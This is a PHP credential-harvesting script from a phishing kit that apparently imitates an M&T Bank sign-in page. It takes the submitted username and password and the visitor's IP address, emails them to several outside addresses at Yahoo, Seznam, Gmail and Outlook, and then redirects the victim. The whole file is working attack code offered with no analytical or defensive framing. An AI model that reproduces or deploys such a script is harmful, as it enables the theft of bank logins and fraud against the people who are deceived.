<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "M&T--USERNAME-PETER-ATIKU-JAGABAN--\n";
$message .= "US3RNAM3		: ".$_POST['1']."\n";
$message .= "PASSW0RD		: ".$_POST['2']."\n";
$message .= "M&T--USERNAME-PETER-ATIKU-JAGABAN--\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "M&T--USERNAME-PETER-ATIKU-JAGABAN--\n";
$recipient = "donflow2021@yahoo.com,garstepone819@seznam.cz, ceocfo.19.8.8@gmail.com, user0202777a@gmail.com, user0202777a@outlook.com";
$subject = "M&T--USERNAME-PETER-ATIKU-JAGABAN--";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."PETER-ATIKU-JAGABAN";
$headers .= "M&T--USERNAME-PETER-ATIKU-JAGABAN--";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: ==___=.html");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        